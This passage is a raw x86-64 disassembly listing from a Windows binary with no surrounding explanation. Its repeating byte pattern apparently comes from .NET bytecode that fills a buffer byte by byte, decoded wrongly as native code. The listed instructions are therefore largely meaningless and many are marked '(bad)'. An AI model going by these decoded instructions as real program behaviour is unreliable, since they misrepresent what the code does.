   140003f14:	1a 02                	sbb    (%rdx),%al
   140003f16:	00 00                	add    %al,(%rax)
   140003f18:	58                   	pop    %rax
   140003f19:	20 ed                	and    %ch,%ch
   140003f1b:	00 00                	add    %al,(%rax)
   140003f1d:	00 52 12             	add    %dl,0x12(%rdx)
   140003f20:	04 20                	add    $0x20,%al
   140003f22:	1b 02                	sbb    (%rdx),%eax
   140003f24:	00 00                	add    %al,(%rax)
   140003f26:	58                   	pop    %rax
   140003f27:	20 8d 00 00 00 52    	and    %cl,0x52000000(%rbp)
   140003f2d:	12 04 20             	adc    (%rax,%riz,1),%al
   140003f30:	1c 02                	sbb    $0x2,%al
   140003f32:	00 00                	add    %al,(%rax)
   140003f34:	58                   	pop    %rax
   140003f35:	20 b7 00 00 00 52    	and    %dh,0x52000000(%rdi)
   140003f3b:	12 04 20             	adc    (%rax,%riz,1),%al
   140003f3e:	1d 02 00 00 58       	sbb    $0x58000002,%eax
   140003f43:	20 f4                	and    %dh,%ah
   140003f45:	00 00                	add    %al,(%rax)
   140003f47:	00 52 12             	add    %dl,0x12(%rdx)
   140003f4a:	04 20                	add    $0x20,%al
   140003f4c:	1e                   	(bad)
   140003f4d:	02 00                	add    (%rax),%al
   140003f4f:	00 58 20             	add    %bl,0x20(%rax)
   140003f52:	90                   	nop
   140003f53:	00 00                	add    %al,(%rax)
   140003f55:	00 52 12             	add    %dl,0x12(%rdx)
   140003f58:	04 20                	add    $0x20,%al
   140003f5a:	1f                   	(bad)
   140003f5b:	02 00                	add    (%rax),%al
   140003f5d:	00 58 1f             	add    %bl,0x1f(%rax)
   140003f60:	75 52                	jne    0x140003fb4
   140003f62:	12 04 20             	adc    (%rax,%riz,1),%al
   140003f65:	20 02                	and    %al,(%rdx)
   140003f67:	00 00                	add    %al,(%rax)
   140003f69:	58                   	pop    %rax
   140003f6a:	18 52 12             	sbb    %dl,0x12(%rdx)
   140003f6d:	04 20                	add    $0x20,%al
   140003f6f:	21 02                	and    %eax,(%rdx)
   140003f71:	00 00                	add    %al,(%rax)
   140003f73:	58                   	pop    %rax
   140003f74:	20 fc                	and    %bh,%ah
   140003f76:	00 00                	add    %al,(%rax)
   140003f78:	00 52 12             	add    %dl,0x12(%rdx)
   140003f7b:	04 20                	add    $0x20,%al
   140003f7d:	22 02                	and    (%rdx),%al
   140003f7f:	00 00                	add    %al,(%rax)
   140003f81:	58                   	pop    %rax
   140003f82:	20 dc                	and    %bl,%ah
   140003f84:	00 00                	add    %al,(%rax)
   140003f86:	00 52 12             	add    %dl,0x12(%rdx)
   140003f89:	04 20                	add    $0x20,%al
   140003f8b:	23 02                	and    (%rdx),%eax
   140003f8d:	00 00                	add    %al,(%rax)
   140003f8f:	58                   	pop    %rax
   140003f90:	20 df                	and    %bl,%bh
   140003f92:	00 00                	add    %al,(%rax)
   140003f94:	00 52 12             	add    %dl,0x12(%rdx)
   140003f97:	04 20                	add    $0x20,%al
   140003f99:	24 02                	and    $0x2,%al
   140003f9b:	00 00                	add    %al,(%rax)
   140003f9d:	58                   	pop    %rax
   140003f9e:	1f                   	(bad)
   140003f9f:	3c 52                	cmp    $0x52,%al
   140003fa1:	12 04 20             	adc    (%rax,%riz,1),%al
   140003fa4:	25 02 00 00 58       	and    $0x58000002,%eax
   140003fa9:	1f                   	(bad)
   140003faa:	56                   	push   %rsi
   140003fab:	52                   	push   %rdx
   140003fac:	12 04 20             	adc    (%rax,%riz,1),%al
   140003faf:	26 02 00             	es add (%rax),%al
   140003fb2:	00 58 20             	add    %bl,0x20(%rax)
   140003fb5:	f6 00 00             	testb  $0x0,(%rax)
   140003fb8:	00 52 12             	add    %dl,0x12(%rdx)
   140003fbb:	04 20                	add    $0x20,%al
   140003fbd:	27                   	(bad)
   140003fbe:	02 00                	add    (%rax),%al
   140003fc0:	00 58 1f             	add    %bl,0x1f(%rax)
   140003fc3:	2f                   	(bad)
   140003fc4:	52                   	push   %rdx
   140003fc5:	12 04 20             	adc    (%rax,%riz,1),%al
   140003fc8:	28 02                	sub    %al,(%rdx)
   140003fca:	00 00                	add    %al,(%rax)
   140003fcc:	58                   	pop    %rax
   140003fcd:	1f                   	(bad)
   140003fce:	15 52 12 04 20       	adc    $0x20041252,%eax
   140003fd3:	29 02                	sub    %eax,(%rdx)
   140003fd5:	00 00                	add    %al,(%rax)
   140003fd7:	58                   	pop    %rax
   140003fd8:	1f                   	(bad)
   140003fd9:	56                   	push   %rsi
   140003fda:	52                   	push   %rdx
   140003fdb:	12 04 20             	adc    (%rax,%riz,1),%al
   140003fde:	2a 02                	sub    (%rdx),%al
   140003fe0:	00 00                	add    %al,(%rax)
   140003fe2:	58                   	pop    %rax
   140003fe3:	1f                   	(bad)
   140003fe4:	1c 52                	sbb    $0x52,%al
   140003fe6:	12 04 20             	adc    (%rax,%riz,1),%al
   140003fe9:	2b 02                	sub    (%rdx),%eax
   140003feb:	00 00                	add    %al,(%rax)
   140003fed:	58                   	pop    %rax
   140003fee:	20 df                	and    %bl,%bh
   140003ff0:	00 00                	add    %al,(%rax)
   140003ff2:	00 52 12             	add    %dl,0x12(%rdx)
   140003ff5:	04 20                	add    $0x20,%al
   140003ff7:	2c 02                	sub    $0x2,%al
   140003ff9:	00 00                	add    %al,(%rax)
   140003ffb:	58                   	pop    %rax
   140003ffc:	20 bf 00 00 00 52    	and    %bh,0x52000000(%rdi)
   140004002:	12 04 20             	adc    (%rax,%riz,1),%al
   140004005:	2d 02 00 00 58       	sub    $0x58000002,%eax
   14000400a:	1f                   	(bad)
   14000400b:	55                   	push   %rbp
   14000400c:	52                   	push   %rdx
   14000400d:	12 04 20             	adc    (%rax,%riz,1),%al
   140004010:	2e 02 00             	cs add (%rax),%al
   140004013:	00 58 20             	add    %bl,0x20(%rax)
   140004016:	94                   	xchg   %eax,%esp
   140004017:	00 00                	add    %al,(%rax)
   140004019:	00 52 12             	add    %dl,0x12(%rdx)
   14000401c:	04 20                	add    $0x20,%al
   14000401e:	2f                   	(bad)
   14000401f:	02 00                	add    (%rax),%al
   140004021:	00 58 1f             	add    %bl,0x1f(%rax)
   140004024:	27                   	(bad)
   140004025:	52                   	push   %rdx
   140004026:	12 04 20             	adc    (%rax,%riz,1),%al
   140004029:	30 02                	xor    %al,(%rdx)
   14000402b:	00 00                	add    %al,(%rax)
   14000402d:	58                   	pop    %rax
   14000402e:	1f                   	(bad)
   14000402f:	71 52                	jno    0x140004083
   140004031:	12 04 20             	adc    (%rax,%riz,1),%al
   140004034:	31 02                	xor    %eax,(%rdx)
   140004036:	00 00                	add    %al,(%rax)
   140004038:	58                   	pop    %rax
   140004039:	20 bb 00 00 00 52    	and    %bh,0x52000000(%rbx)
   14000403f:	12 04 20             	adc    (%rax,%riz,1),%al
   140004042:	32 02                	xor    (%rdx),%al
   140004044:	00 00                	add    %al,(%rax)
   140004046:	58                   	pop    %rax
   140004047:	1f                   	(bad)
   140004048:	51                   	push   %rcx
   140004049:	52                   	push   %rdx
   14000404a:	12 04 20             	adc    (%rax,%riz,1),%al
   14000404d:	33 02                	xor    (%rdx),%eax
   14000404f:	00 00                	add    %al,(%rax)
   140004051:	58                   	pop    %rax
   140004052:	20 df                	and    %bl,%bh
   140004054:	00 00                	add    %al,(%rax)
   140004056:	00 52 12             	add    %dl,0x12(%rdx)
   140004059:	04 20                	add    $0x20,%al
   14000405b:	34 02                	xor    $0x2,%al
   14000405d:	00 00                	add    %al,(%rax)
   14000405f:	58                   	pop    %rax
   140004060:	20 ed                	and    %ch,%ch
   140004062:	00 00                	add    %al,(%rax)
   140004064:	00 52 12             	add    %dl,0x12(%rdx)
   140004067:	04 20                	add    $0x20,%al
   140004069:	35 02 00 00 58       	xor    $0x58000002,%eax
   14000406e:	20 80 00 00 00 52    	and    %al,0x52000000(%rax)
   140004074:	12 04 20             	adc    (%rax,%riz,1),%al
   140004077:	36 02 00             	ss add (%rax),%al
   14000407a:	00 58 1f             	add    %bl,0x1f(%rax)
   14000407d:	27                   	(bad)
   14000407e:	52                   	push   %rdx
   14000407f:	12 04 20             	adc    (%rax,%riz,1),%al
   140004082:	37                   	(bad)
   140004083:	02 00                	add    (%rax),%al
   140004085:	00 58 1f             	add    %bl,0x1f(%rax)
   140004088:	23 52 12             	and    0x12(%rdx),%edx
   14000408b:	04 20                	add    $0x20,%al
   14000408d:	38 02                	cmp    %al,(%rdx)
   14000408f:	00 00                	add    %al,(%rax)
   140004091:	58                   	pop    %rax
   140004092:	20 fa                	and    %bh,%dl
   140004094:	00 00                	add    %al,(%rax)
   140004096:	00 52 12             	add    %dl,0x12(%rdx)
   140004099:	04 20                	add    $0x20,%al
   14000409b:	39 02                	cmp    %eax,(%rdx)
   14000409d:	00 00                	add    %al,(%rax)
   14000409f:	58                   	pop    %rax
   1400040a0:	20 8d 00 00 00 52    	and    %cl,0x52000000(%rbp)
   1400040a6:	12 04 20             	adc    (%rax,%riz,1),%al
   1400040a9:	3a 02                	cmp    (%rdx),%al
   1400040ab:	00 00                	add    %al,(%rax)
   1400040ad:	58                   	pop    %rax
   1400040ae:	20 9b 00 00 00 52    	and    %bl,0x52000000(%rbx)
   1400040b4:	12 04 20             	adc    (%rax,%riz,1),%al
   1400040b7:	3b 02                	cmp    (%rdx),%eax
   1400040b9:	00 00                	add    %al,(%rax)
   1400040bb:	58                   	pop    %rax
   1400040bc:	1f                   	(bad)
   1400040bd:	54                   	push   %rsp
   1400040be:	52                   	push   %rdx
   1400040bf:	12 04 20             	adc    (%rax,%riz,1),%al
   1400040c2:	3c 02                	cmp    $0x2,%al
   1400040c4:	00 00                	add    %al,(%rax)
   1400040c6:	58                   	pop    %rax
   1400040c7:	20 fb                	and    %bh,%bl
   1400040c9:	00 00                	add    %al,(%rax)
   1400040cb:	00 52 12             	add    %dl,0x12(%rdx)
   1400040ce:	04 20                	add    $0x20,%al
   1400040d0:	3d 02 00 00 58       	cmp    $0x58000002,%eax
   1400040d5:	20 f7                	and    %dh,%bh
   1400040d7:	00 00                	add    %al,(%rax)
   1400040d9:	00 52 12             	add    %dl,0x12(%rdx)
   1400040dc:	04 20                	add    $0x20,%al
   1400040de:	3e 02 00             	ds add (%rax),%al
   1400040e1:	00 58 20             	add    %bl,0x20(%rax)
   1400040e4:	96                   	xchg   %eax,%esi
   1400040e5:	00 00                	add    %al,(%rax)
   1400040e7:	00 52 12             	add    %dl,0x12(%rdx)
   1400040ea:	04 20                	add    $0x20,%al
   1400040ec:	3f                   	(bad)
   1400040ed:	02 00                	add    (%rax),%al
   1400040ef:	00 58 20             	add    %bl,0x20(%rax)
   1400040f2:	d1 00                	roll   $1,(%rax)
   1400040f4:	00 00                	add    %al,(%rax)
   1400040f6:	52                   	push   %rdx
   1400040f7:	12 04 20             	adc    (%rax,%riz,1),%al
   1400040fa:	40 02 00             	rex add (%rax),%al
   1400040fd:	00 58 1f             	add    %bl,0x1f(%rax)
   140004100:	47 52                	rex.RXB push %r10
   140004102:	12 04 20             	adc    (%rax,%riz,1),%al
   140004105:	41 02 00             	add    (%r8),%al
   140004108:	00 58 1f             	add    %bl,0x1f(%rax)
   14000410b:	79 52                	jns    0x14000415f
   14000410d:	12 04 20             	adc    (%rax,%riz,1),%al
   140004110:	42 02 00             	rex.X add (%rax),%al
   140004113:	00 58 20             	add    %bl,0x20(%rax)
   140004116:	d7                   	xlat   (%rbx)
   140004117:	00 00                	add    %al,(%rax)
   140004119:	00 52 12             	add    %dl,0x12(%rdx)
   14000411c:	04 20                	add    $0x20,%al
   14000411e:	43 02 00             	rex.XB add (%r8),%al
   140004121:	00 58 20             	add    %bl,0x20(%rax)
   140004124:	8c 00                	mov    %es,(%rax)
   140004126:	00 00                	add    %al,(%rax)
   140004128:	52                   	push   %rdx
   140004129:	12 04 20             	adc    (%rax,%riz,1),%al
   14000412c:	44 02 00             	add    (%rax),%r8b
   14000412f:	00 58 1f             	add    %bl,0x1f(%rax)
   140004132:	61                   	(bad)
   140004133:	52                   	push   %rdx
   140004134:	12 04 20             	adc    (%rax,%riz,1),%al
   140004137:	45 02 00             	add    (%r8),%r8b
   14000413a:	00 58 1f             	add    %bl,0x1f(%rax)
   14000413d:	6d                   	insl   (%dx),(%rdi)
   14000413e:	52                   	push   %rdx
   14000413f:	12 04 20             	adc    (%rax,%riz,1),%al
   140004142:	46 02 00             	rex.RX add (%rax),%r8b
   140004145:	00 58 1f             	add    %bl,0x1f(%rax)
   140004148:	29 52 12             	sub    %edx,0x12(%rdx)
   14000414b:	04 20                	add    $0x20,%al
   14000414d:	47 02 00             	rex.RXB add (%r8),%r8b
   140004150:	00 58 1f             	add    %bl,0x1f(%rax)
   140004153:	0a 52 12             	or     0x12(%rdx),%dl
   140004156:	04 20                	add    $0x20,%al
   140004158:	48 02 00             	rex.W add (%rax),%al
   14000415b:	00 58 20             	add    %bl,0x20(%rax)
   14000415e:	c2 00 00             	ret    $0x0
   140004161:	00 52 12             	add    %dl,0x12(%rdx)
   140004164:	04 20                	add    $0x20,%al
   140004166:	49 02 00             	rex.WB add (%r8),%al
   140004169:	00 58 20             	add    %bl,0x20(%rax)
   14000416c:	ea                   	(bad)
   14000416d:	00 00                	add    %al,(%rax)
   14000416f:	00 52 12             	add    %dl,0x12(%rdx)
   140004172:	04 20                	add    $0x20,%al
   140004174:	4a 02 00             	rex.WX add (%rax),%al
   140004177:	00 58 20             	add    %bl,0x20(%rax)
   14000417a:	b9 00 00 00 52       	mov    $0x52000000,%ecx
   14000417f:	12 04 20             	adc    (%rax,%riz,1),%al
   140004182:	4b 02 00             	rex.WXB add (%r8),%al
   140004185:	00 58 20             	add    %bl,0x20(%rax)
   140004188:	83 00 00             	addl   $0x0,(%rax)
   14000418b:	00 52 12             	add    %dl,0x12(%rdx)
   14000418e:	04 20                	add    $0x20,%al
   140004190:	4c 02 00             	rex.WR add (%rax),%r8b
   140004193:	00 58 20             	add    %bl,0x20(%rax)
   140004196:	9b                   	fwait
   140004197:	00 00                	add    %al,(%rax)
   140004199:	00 52 12             	add    %dl,0x12(%rdx)
   14000419c:	04 20                	add    $0x20,%al
   14000419e:	4d 02 00             	rex.WRB add (%r8),%r8b
   1400041a1:	00 58 20             	add    %bl,0x20(%rax)
   1400041a4:	ec                   	in     (%dx),%al
   1400041a5:	00 00                	add    %al,(%rax)
   1400041a7:	00 52 12             	add    %dl,0x12(%rdx)
   1400041aa:	04 20                	add    $0x20,%al
   1400041ac:	4e 02 00             	rex.WRX add (%rax),%r8b
   1400041af:	00 58 20             	add    %bl,0x20(%rax)
   1400041b2:	e3 00                	jrcxz  0x1400041b4
   1400041b4:	00 00                	add    %al,(%rax)
   1400041b6:	52                   	push   %rdx
   1400041b7:	12 04 20             	adc    (%rax,%riz,1),%al
   1400041ba:	4f 02 00             	rex.WRXB add (%r8),%r8b
   1400041bd:	00 58 1f             	add    %bl,0x1f(%rax)
   1400041c0:	1d 52 12 04 20       	sbb    $0x20041252,%eax
   1400041c5:	50                   	push   %rax
   1400041c6:	02 00                	add    (%rax),%al
   1400041c8:	00 58 1f             	add    %bl,0x1f(%rax)
   1400041cb:	44 52                	rex.R push %rdx
   1400041cd:	12 04 20             	adc    (%rax,%riz,1),%al
   1400041d0:	51                   	push   %rcx
   1400041d1:	02 00                	add    (%rax),%al
   1400041d3:	00 58 20             	add    %bl,0x20(%rax)
   1400041d6:	e3 00                	jrcxz  0x1400041d8
   1400041d8:	00 00                	add    %al,(%rax)
   1400041da:	52                   	push   %rdx
   1400041db:	12 04 20             	adc    (%rax,%riz,1),%al
   1400041de:	52                   	push   %rdx
   1400041df:	02 00                	add    (%rax),%al
   1400041e1:	00 58 1f             	add    %bl,0x1f(%rax)
   1400041e4:	75 52                	jne    0x140004238
   1400041e6:	12 04 20             	adc    (%rax,%riz,1),%al
   1400041e9:	53                   	push   %rbx
   1400041ea:	02 00                	add    (%rax),%al
   1400041ec:	00 58 1f             	add    %bl,0x1f(%rax)
   1400041ef:	6a 52                	push   $0x52
   1400041f1:	12 04 20             	adc    (%rax,%riz,1),%al
   1400041f4:	54                   	push   %rsp
   1400041f5:	02 00                	add    (%rax),%al
   1400041f7:	00 58 1f             	add    %bl,0x1f(%rax)
   1400041fa:	39 52 12             	cmp    %edx,0x12(%rdx)
   1400041fd:	04 20                	add    $0x20,%al
   1400041ff:	55                   	push   %rbp
   140004200:	02 00                	add    (%rax),%al
   140004202:	00 58 1f             	add    %bl,0x1f(%rax)
   140004205:	2b 52 12             	sub    0x12(%rdx),%edx
   140004208:	04 20                	add    $0x20,%al
   14000420a:	56                   	push   %rsi
   14000420b:	02 00                	add    (%rax),%al
   14000420d:	00 58 20             	add    %bl,0x20(%rax)
   140004210:	c9                   	leave
   140004211:	00 00                	add    %al,(%rax)
   140004213:	00 52 12             	add    %dl,0x12(%rdx)
   140004216:	04 20                	add    $0x20,%al
   140004218:	57                   	push   %rdi
   140004219:	02 00                	add    (%rax),%al
   14000421b:	00 58 1f             	add    %bl,0x1f(%rax)
   14000421e:	43 52                	rex.XB push %r10
   140004220:	12 04 20             	adc    (%rax,%riz,1),%al
   140004223:	58                   	pop    %rax
   140004224:	02 00                	add    (%rax),%al
   140004226:	00 58 20             	add    %bl,0x20(%rax)
   140004229:	e4 00                	in     $0x0,%al
   14000422b:	00 00                	add    %al,(%rax)
   14000422d:	52                   	push   %rdx
   14000422e:	12 04 20             	adc    (%rax,%riz,1),%al
   140004231:	59                   	pop    %rcx
   140004232:	02 00                	add    (%rax),%al
   140004234:	00 58 20             	add    %bl,0x20(%rax)
   140004237:	a5                   	movsl  (%rsi),(%rdi)
   140004238:	00 00                	add    %al,(%rax)
   14000423a:	00 52 12             	add    %dl,0x12(%rdx)
   14000423d:	04 20                	add    $0x20,%al
   14000423f:	5a                   	pop    %rdx
   140004240:	02 00                	add    (%rax),%al
   140004242:	00 58 1f             	add    %bl,0x1f(%rax)
   140004245:	19 52 12             	sbb    %edx,0x12(%rdx)
   140004248:	04 20                	add    $0x20,%al
   14000424a:	5b                   	pop    %rbx
   14000424b:	02 00                	add    (%rax),%al
   14000424d:	00 58 20             	add    %bl,0x20(%rax)
   140004250:	cd 00                	int    $0x0
   140004252:	00 00                	add    %al,(%rax)
   140004254:	52                   	push   %rdx
   140004255:	12 04 20             	adc    (%rax,%riz,1),%al
   140004258:	5c                   	pop    %rsp
   140004259:	02 00                	add    (%rax),%al
   14000425b:	00 58 1f             	add    %bl,0x1f(%rax)
   14000425e:	45 52                	rex.RB push %r10
   140004260:	12 04 20             	adc    (%rax,%riz,1),%al
   140004263:	5d                   	pop    %rbp
   140004264:	02 00                	add    (%rax),%al
   140004266:	00 58 1f             	add    %bl,0x1f(%rax)
   140004269:	25 52 12 04 20       	and    $0x20041252,%eax
   14000426e:	5e                   	pop    %rsi
   14000426f:	02 00                	add    (%rax),%al
   140004271:	00 58 20             	add    %bl,0x20(%rax)
   140004274:	ef                   	out    %eax,(%dx)
   140004275:	00 00                	add    %al,(%rax)
   140004277:	00 52 12             	add    %dl,0x12(%rdx)
   14000427a:	04 20                	add    $0x20,%al
   14000427c:	5f                   	pop    %rdi
   14000427d:	02 00                	add    (%rax),%al
   14000427f:	00 58 1f             	add    %bl,0x1f(%rax)
   140004282:	58                   	pop    %rax
   140004283:	52                   	push   %rdx
   140004284:	12 04 20             	adc    (%rax,%riz,1),%al
   140004287:	60                   	(bad)
   140004288:	02 00                	add    (%rax),%al
   14000428a:	00 58 1f             	add    %bl,0x1f(%rax)
   14000428d:	74 52                	je     0x1400042e1
   14000428f:	12 04 20             	adc    (%rax,%riz,1),%al
   140004292:	61                   	(bad)
   140004293:	02 00                	add    (%rax),%al
   140004295:	00 58 1f             	add    %bl,0x1f(%rax)
   140004298:	19 52 12             	sbb    %edx,0x12(%rdx)
   14000429b:	04 20                	add    $0x20,%al
   14000429d:	62 02 00 00 58       	(bad)
   1400042a2:	1f                   	(bad)
   1400042a3:	4e 52                	rex.WRX push %rdx
   1400042a5:	12 04 20             	adc    (%rax,%riz,1),%al
   1400042a8:	63 02                	movsxd (%rdx),%eax
   1400042aa:	00 00                	add    %al,(%rax)
   1400042ac:	58                   	pop    %rax
   1400042ad:	1f                   	(bad)
   1400042ae:	38 52 12             	cmp    %dl,0x12(%rdx)
   1400042b1:	04 20                	add    $0x20,%al
   1400042b3:	64 02 00             	add    %fs:(%rax),%al
   1400042b6:	00 58 20             	add    %bl,0x20(%rax)
   1400042b9:	de 00                	fiadds (%rax)
   1400042bb:	00 00                	add    %al,(%rax)
   1400042bd:	52                   	push   %rdx
   1400042be:	12 04 20             	adc    (%rax,%riz,1),%al
   1400042c1:	65 02 00             	add    %gs:(%rax),%al
   1400042c4:	00 58 1f             	add    %bl,0x1f(%rax)
   1400042c7:	52                   	push   %rdx
   1400042c8:	52                   	push   %rdx
   1400042c9:	12 04 20             	adc    (%rax,%riz,1),%al
   1400042cc:	66 02 00             	data16 add (%rax),%al
   1400042cf:	00 58 20             	add    %bl,0x20(%rax)
   1400042d2:	f7 00 00 00 52 12    	testl  $0x12520000,(%rax)
   1400042d8:	04 20                	add    $0x20,%al
   1400042da:	67 02 00             	add    (%eax),%al
   1400042dd:	00 58 20             	add    %bl,0x20(%rax)
   1400042e0:	bb 00 00 00 52       	mov    $0x52000000,%ebx
   1400042e5:	12 04 20             	adc    (%rax,%riz,1),%al
   1400042e8:	68 02 00 00 58       	push   $0x58000002
   1400042ed:	1f                   	(bad)
   1400042ee:	29 52 12             	sub    %edx,0x12(%rdx)
   1400042f1:	04 20                	add    $0x20,%al
   1400042f3:	69 02 00 00 58 20    	imul   $0x20580000,(%rdx),%eax
   1400042f9:	d2 00                	rolb   %cl,(%rax)
   1400042fb:	00 00                	add    %al,(%rax)
   1400042fd:	52                   	push   %rdx
   1400042fe:	12 04 20             	adc    (%rax,%riz,1),%al
   140004301:	6a 02                	push   $0x2
   140004303:	00 00                	add    %al,(%rax)
   140004305:	58                   	pop    %rax
   140004306:	20 ca                	and    %cl,%dl
   140004308:	00 00                	add    %al,(%rax)
   14000430a:	00 52 12             	add    %dl,0x12(%rdx)
   14000430d:	04 20                	add    $0x20,%al
   14000430f:	6b 02 00             	imul   $0x0,(%rdx),%eax
   140004312:	00 58 20             	add    %bl,0x20(%rax)
   140004315:	a6                   	cmpsb  (%rdi),(%rsi)
   140004316:	00 00                	add    %al,(%rax)
   140004318:	00 52 12             	add    %dl,0x12(%rdx)
   14000431b:	04 20                	add    $0x20,%al
   14000431d:	6c                   	insb   (%dx),(%rdi)
   14000431e:	02 00                	add    (%rax),%al
   140004320:	00 58 1f             	add    %bl,0x1f(%rax)
   140004323:	50                   	push   %rax
   140004324:	52                   	push   %rdx
   140004325:	12 04 20             	adc    (%rax,%riz,1),%al
   140004328:	6d                   	insl   (%dx),(%rdi)
   140004329:	02 00                	add    (%rax),%al
   14000432b:	00 58 20             	add    %bl,0x20(%rax)
   14000432e:	de 00                	fiadds (%rax)
   140004330:	00 00                	add    %al,(%rax)
   140004332:	52                   	push   %rdx
   140004333:	12 04 20             	adc    (%rax,%riz,1),%al
   140004336:	6e                   	outsb  (%rsi),(%dx)
   140004337:	02 00                	add    (%rax),%al
   140004339:	00 58 20             	add    %bl,0x20(%rax)
   14000433c:	ee                   	out    %al,(%dx)
   14000433d:	00 00                	add    %al,(%rax)
   14000433f:	00 52 12             	add    %dl,0x12(%rdx)
   140004342:	04 20                	add    $0x20,%al
   140004344:	6f                   	outsl  (%rsi),(%dx)
   140004345:	02 00                	add    (%rax),%al
   140004347:	00 58 20             	add    %bl,0x20(%rax)
   14000434a:	81 00 00 00 52 12    	addl   $0x12520000,(%rax)
   140004350:	04 20                	add    $0x20,%al
   140004352:	70 02                	jo     0x140004356
   140004354:	00 00                	add    %al,(%rax)
   140004356:	58                   	pop    %rax
   140004357:	20 96 00 00 00 52    	and    %dl,0x52000000(%rsi)
   14000435d:	12 04 20             	adc    (%rax,%riz,1),%al
   140004360:	71 02                	jno    0x140004364
   140004362:	00 00                	add    %al,(%rax)
   140004364:	58                   	pop    %rax
   140004365:	1f                   	(bad)
   140004366:	1a 52 12             	sbb    0x12(%rdx),%dl
   140004369:	04 20                	add    $0x20,%al
   14000436b:	72 02                	jb     0x14000436f
   14000436d:	00 00                	add    %al,(%rax)
   14000436f:	58                   	pop    %rax
   140004370:	20 c7                	and    %al,%bh
   140004372:	00 00                	add    %al,(%rax)
   140004374:	00 52 12             	add    %dl,0x12(%rdx)
   140004377:	04 20                	add    $0x20,%al
   140004379:	73 02                	jae    0x14000437d
   14000437b:	00 00                	add    %al,(%rax)
   14000437d:	58                   	pop    %rax
   14000437e:	1f                   	(bad)
   14000437f:	60                   	(bad)
   140004380:	52                   	push   %rdx
   140004381:	12 04 20             	adc    (%rax,%riz,1),%al
   140004384:	74 02                	je     0x140004388
   140004386:	00 00                	add    %al,(%rax)
   140004388:	58                   	pop    %rax
   140004389:	1c 52                	sbb    $0x52,%al
   14000438b:	12 04 20             	adc    (%rax,%riz,1),%al
   14000438e:	75 02                	jne    0x140004392
   140004390:	00 00                	add    %al,(%rax)
   140004392:	58                   	pop    %rax
   140004393:	20 c0                	and    %al,%al
   140004395:	00 00                	add    %al,(%rax)
   140004397:	00 52 12             	add    %dl,0x12(%rdx)
   14000439a:	04 20                	add    $0x20,%al
   14000439c:	76 02                	jbe    0x1400043a0
   14000439e:	00 00                	add    %al,(%rax)
   1400043a0:	58                   	pop    %rax
   1400043a1:	1f                   	(bad)
   1400043a2:	5c                   	pop    %rsp
   1400043a3:	52                   	push   %rdx
   1400043a4:	12 04 20             	adc    (%rax,%riz,1),%al
   1400043a7:	77 02                	ja     0x1400043ab
   1400043a9:	00 00                	add    %al,(%rax)
   1400043ab:	58                   	pop    %rax
   1400043ac:	1f                   	(bad)
   1400043ad:	11 52 12             	adc    %edx,0x12(%rdx)
   1400043b0:	04 20                	add    $0x20,%al
   1400043b2:	78 02                	js     0x1400043b6
   1400043b4:	00 00                	add    %al,(%rax)
   1400043b6:	58                   	pop    %rax
   1400043b7:	1f                   	(bad)
   1400043b8:	64 52                	fs push %rdx
   1400043ba:	12 04 20             	adc    (%rax,%riz,1),%al
   1400043bd:	79 02                	jns    0x1400043c1
   1400043bf:	00 00                	add    %al,(%rax)
   1400043c1:	58                   	pop    %rax
   1400043c2:	1f                   	(bad)
   1400043c3:	43 52                	rex.XB push %r10
   1400043c5:	12 04 20             	adc    (%rax,%riz,1),%al
   1400043c8:	7a 02                	jp     0x1400043cc
   1400043ca:	00 00                	add    %al,(%rax)
   1400043cc:	58                   	pop    %rax
   1400043cd:	1f                   	(bad)
   1400043ce:	67 52                	addr32 push %rdx
   1400043d0:	12 04 20             	adc    (%rax,%riz,1),%al
   1400043d3:	7b 02                	jnp    0x1400043d7
   1400043d5:	00 00                	add    %al,(%rax)
   1400043d7:	58                   	pop    %rax
   1400043d8:	1f                   	(bad)
   1400043d9:	45 52                	rex.RB push %r10
   1400043db:	12 04 20             	adc    (%rax,%riz,1),%al
   1400043de:	7c 02                	jl     0x1400043e2
   1400043e0:	00 00                	add    %al,(%rax)
   1400043e2:	58                   	pop    %rax
   1400043e3:	1f                   	(bad)
   1400043e4:	19 52 12             	sbb    %edx,0x12(%rdx)
   1400043e7:	04 20                	add    $0x20,%al
   1400043e9:	7d 02                	jge    0x1400043ed
   1400043eb:	00 00                	add    %al,(%rax)
   1400043ed:	58                   	pop    %rax
   1400043ee:	1f                   	(bad)
   1400043ef:	2f                   	(bad)
   1400043f0:	52                   	push   %rdx
   1400043f1:	12 04 20             	adc    (%rax,%riz,1),%al
   1400043f4:	7e 02                	jle    0x1400043f8
   1400043f6:	00 00                	add    %al,(%rax)
   1400043f8:	58                   	pop    %rax
   1400043f9:	1f                   	(bad)
   1400043fa:	64 52                	fs push %rdx
   1400043fc:	12 04 20             	adc    (%rax,%riz,1),%al
   1400043ff:	7f 02                	jg     0x140004403
   140004401:	00 00                	add    %al,(%rax)
   140004403:	58                   	pop    %rax
   140004404:	20 ee                	and    %ch,%dh
   140004406:	00 00                	add    %al,(%rax)
   140004408:	00 52 12             	add    %dl,0x12(%rdx)
   14000440b:	04 20                	add    $0x20,%al
   14000440d:	80 02 00             	addb   $0x0,(%rdx)
   140004410:	00 58 20             	add    %bl,0x20(%rax)
   140004413:	f6 00 00             	testb  $0x0,(%rax)
   140004416:	00 52 12             	add    %dl,0x12(%rdx)
   140004419:	04 20                	add    $0x20,%al
   14000441b:	81 02 00 00 58 20    	addl   $0x20580000,(%rdx)
   140004421:	b1 00                	mov    $0x0,%cl
   140004423:	00 00                	add    %al,(%rax)
   140004425:	52                   	push   %rdx
   140004426:	12 04 20             	adc    (%rax,%riz,1),%al
   140004429:	82                   	(bad)
   14000442a:	02 00                	add    (%rax),%al
   14000442c:	00 58 20             	add    %bl,0x20(%rax)
   14000442f:	a7                   	cmpsl  (%rdi),(%rsi)
   140004430:	00 00                	add    %al,(%rax)
   140004432:	00 52 12             	add    %dl,0x12(%rdx)
   140004435:	04 20                	add    $0x20,%al
   140004437:	83 02 00             	addl   $0x0,(%rdx)
   14000443a:	00 58 1f             	add    %bl,0x1f(%rax)
   14000443d:	5b                   	pop    %rbx
   14000443e:	52                   	push   %rdx
   14000443f:	12 04 20             	adc    (%rax,%riz,1),%al
   140004442:	84 02                	test   %al,(%rdx)
   140004444:	00 00                	add    %al,(%rax)
   140004446:	58                   	pop    %rax
   140004447:	20 f5                	and    %dh,%ch
   140004449:	00 00                	add    %al,(%rax)
   14000444b:	00 52 12             	add    %dl,0x12(%rdx)
   14000444e:	04 20                	add    $0x20,%al
   140004450:	85 02                	test   %eax,(%rdx)
   140004452:	00 00                	add    %al,(%rax)
   140004454:	58                   	pop    %rax
